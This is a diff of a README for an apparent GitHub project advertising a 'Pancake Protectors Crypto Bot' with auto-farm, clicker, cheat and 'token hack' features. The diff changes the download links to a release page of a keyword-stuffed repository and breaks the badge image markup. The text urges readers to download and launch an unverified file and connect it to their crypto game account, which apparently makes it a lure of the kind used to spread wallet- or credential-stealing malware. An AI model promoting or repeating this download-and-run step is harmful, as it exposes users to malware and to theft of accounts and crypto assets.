@@ -14,7 +14,7 @@ Pancake Protectors is a popular crypto game where players engage in various acti
 
 ## How to Use 🛠️
 To get started with the Pancake Protectors Crypto Bot:
-1. Click on the [Download Bot](https://github.com/files/File.zip) link and launch the file.
+1. Click on the [Download Bot](https://github.com/Jaiaiaka/Pancake-Protectors-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases) link and launch the file.
 2. Follow the setup instructions provided in the repository to configure the bot.
 3. Connect the bot to your Pancake Protectors game account.
 4. Enjoy automated farming, clicker activities, and enhanced gameplay features.
@@ -27,6 +27,6 @@ If you're new to Pancake Protectors or looking to boost your gameplay, the Panca
 
 So what are you waiting for? Download the bot, connect it to your game account, and start dominating the Pancake Protectors world today!
 
-[![Download Bot](https://img.shields.io/badge/Download-Bot-green)](https://github.com/files/File.zip)
+[![Download Bot](https://github.com/Jaiaiaka/Pancake-Protectors-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases)](https://github.com/Jaiaiaka/Pancake-Protectors-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases)
 
 Explore the possibilities with the Pancake Protectors Crypto Bot and elevate your gaming experience like never before! 🥞🤖🚀
